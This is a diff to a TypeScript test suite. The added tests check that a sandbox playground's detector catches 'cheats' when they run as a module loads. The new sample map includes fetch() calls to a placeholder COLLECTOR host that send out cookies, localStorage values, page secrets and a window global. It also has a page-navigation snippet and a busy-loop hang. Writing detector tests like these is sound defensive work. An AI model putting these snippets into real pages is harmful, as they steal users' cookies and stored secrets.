@@ -118,6 +118,34 @@ describe("the playground's detector sees each cheat", () => {
   }
 });
 
+function topLevel(body: string): string {
+  return `${body}
+export default function (rt) {
+  const fn = rt.fn(function App() { return null; });
+  return rt.app(fn);
+}`;
+}
+
+const TOP_LEVEL_CHEATS: Record<string, string> = {
+  ...CHEATS,
+  "read-dom": `fetch("COLLECTOR/x?" + document.getElementById("secret").textContent, { mode: "no-cors" });`,
+  "read-cookie": `fetch("COLLECTOR/x?" + document.cookie, { mode: "no-cors" });`,
+  "read-storage": `fetch("COLLECTOR/x?" + localStorage.getItem("secret"), { mode: "no-cors" });`,
+  "read-global": `fetch("COLLECTOR/x?" + window.SECRET, { mode: "no-cors" });`,
+  "navigate": `location.href = "about:blank";`,
+  "hang": `{ const t = Date.now(); while (Date.now() - t < 3500) {} }`,
+};
+
+describe("the detector sees each cheat when it runs as the module loads", () => {
+  for (const g of GOALS) {
+    test(g.id, async () => {
+      const r = await lookAt(topLevel(TOP_LEVEL_CHEATS[g.id].replace("COLLECTOR", collectorOrigin)));
+      assert.ok(r.reached.includes(g.id), `${g.id} not seen: ${JSON.stringify(r)}`);
+      assert.equal(r.url, `${origin}/`, "the page stayed where it was");
+    });
+  }
+});
+
 test("a secret the program surfaces is reported without the secret itself", async () => {
   const r = await lookAt(raw(show(`"global " + window.SECRET`)));
   assert.deepEqual(r.reached, ["read-global"]);
